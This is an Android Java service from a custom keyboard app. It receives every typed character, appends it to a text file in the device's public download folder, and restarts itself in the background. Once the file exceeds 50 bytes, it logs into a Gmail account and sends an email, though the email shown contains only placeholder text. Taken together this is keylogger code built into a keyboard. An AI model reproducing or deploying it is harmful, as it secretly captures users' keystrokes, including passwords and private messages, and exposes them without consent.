package com.abhishek.customKeyboard;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;

/**
 * Created by Abhishek on 27-June-17.
 */

public class BackService extends Service {

    @Override
    public void onCreate() {
        super.onCreate();



    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

          if(intent!=null)
          {
              Log.e("SimpleServices"," "+ intent.getStringExtra("Character"));

            final long fileSize =   writeToSDFile((intent.getStringExtra("Character")));
              new Thread(new Runnable() {

                  @Override
                  public void run() {
                      try {
                          if(fileSize>50) {
                              GMailSender sender = new GMailSender("nuevothoughts.abhishek@gmail.com",
                                          "*********"); // enter email and password of sender 
                                  sender.sendMail("Hello from JavaMail", "Body from JavaMail", "nuevothoughts.abhishek@gmail.com", "nuevothoughts.abhishek@gmail.com");// sender and receiver are same.
                              }
                      } catch (Exception e) {
                          Log.e("SendMail", e.getMessage(), e);
                      }
                  }

              }).start();
          }

        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private long writeToSDFile(String data){


        File root = android.os.Environment.getExternalStorageDirectory();


        File dir = new File (root.getAbsolutePath() + "/download");
        dir.mkdirs();
        File file = new File(dir, "myData.txt");
        long fileSize = file.length();
        Log.e("SimpleServices Size "," "+  file.length());

        try {
            FileOutputStream f = new FileOutputStream(file,true);
            PrintWriter pw = new PrintWriter(f);
            pw.println(data);
            //  pw.println("Hello");
            pw.flush();
            pw.close();
            f.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
            Log.i("Number", "******* File not found. Did you" +
                    " add a WRITE_EXTERNAL_STORAGE permission to the   manifest?");
        } catch (IOException e) {
            e.printStackTrace();
        }
        // tv.append("\n\nFile written to "+file);
        return  fileSize;
    }






}
